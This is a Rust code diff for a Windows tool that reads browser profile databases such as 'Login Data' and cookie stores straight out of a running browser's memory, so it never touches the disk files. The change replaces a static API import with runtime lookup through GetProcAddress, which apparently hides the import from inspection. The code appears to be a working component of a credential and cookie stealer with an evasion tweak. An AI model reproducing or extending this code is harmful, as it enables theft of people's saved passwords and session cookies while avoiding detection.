@@ -1,12 +1,14 @@
 use std::ffi::c_void;
-use std::mem::{size_of, zeroed};
+use std::mem::{size_of, transmute, zeroed};
+use std::sync::OnceLock;
 
 use rusqlite::Connection;
+use windows::core::{s, w, PWSTR};
 use windows::Win32::Foundation::HANDLE;
+use windows::Win32::System::LibraryLoader::{GetModuleHandleW, GetProcAddress};
 use windows::Win32::System::Memory::{
     VirtualQueryEx, MEMORY_BASIC_INFORMATION, MEM_COMMIT, MEM_MAPPED, PAGE_READONLY,
 };
-use windows::Win32::System::ProcessStatus::K32GetMappedFileNameW;
 use windows::Win32::System::SystemInformation::{GetSystemInfo, SYSTEM_INFO};
 
 use crate::crypto;
@@ -40,11 +42,27 @@ pub struct CookieRow {
 /// the cookie's domain before the actual value.
 const COOKIE_PLAINTEXT_HEADER: usize = 32;
 
+type GetMappedFileNameWFn = unsafe extern "system" fn(HANDLE, *mut c_void, PWSTR, u32) -> u32;
+
+fn get_mapped_file_name_fn() -> Option<GetMappedFileNameWFn> {
+    static FN: OnceLock<Option<GetMappedFileNameWFn>> = OnceLock::new();
+    *FN.get_or_init(|| unsafe {
+        let kernel32 = GetModuleHandleW(w!("kernel32.dll")).ok()?;
+        let address = GetProcAddress(kernel32, s!("K32GetMappedFileNameW")).or_else(|| {
+            let psapi = GetModuleHandleW(w!("psapi.dll")).ok()?;
+            GetProcAddress(psapi, s!("GetMappedFileNameW"))
+        })?;
+        Some(transmute(address))
+    })
+}
+
 /// Scan a process' address space for a memory-mapped file of the default
 /// profile (e.g. "...\User Data\Default\Login Data") and return its contents.
 /// The database files are held open by the browser and mapped read-only, so we
 /// can copy the image straight out of memory without touching the disk files.
 pub fn find_default_profile_file(h: HANDLE, file_name: &str) -> Option<Vec<u8>> {
+    let get_mapped_file_name = get_mapped_file_name_fn()?;
+
     let mut system_info: SYSTEM_INFO = unsafe { zeroed() };
     unsafe { GetSystemInfo(&mut system_info) };
 
@@ -68,7 +86,14 @@ pub fn find_default_profile_file(h: HANDLE, file_name: &str) -> Option<Vec<u8>> 
         if mbi.State == MEM_COMMIT && mbi.Protect.contains(PAGE_READONLY) && mbi.Type == MEM_MAPPED
         {
             let mut name_buf = [0u16; 1024];
-            let len = unsafe { K32GetMappedFileNameW(h, mbi.BaseAddress, &mut name_buf) } as usize;
+            let len = unsafe {
+                get_mapped_file_name(
+                    h,
+                    mbi.BaseAddress,
+                    PWSTR(name_buf.as_mut_ptr()),
+                    name_buf.len() as u32,
+                )
+            } as usize;
             if len > 0 && len < name_buf.len() {
                 let full = String::from_utf16_lossy(&name_buf[..len]);
                 let base = full.rsplit(['\\', '/']).next().unwrap_or(&full);
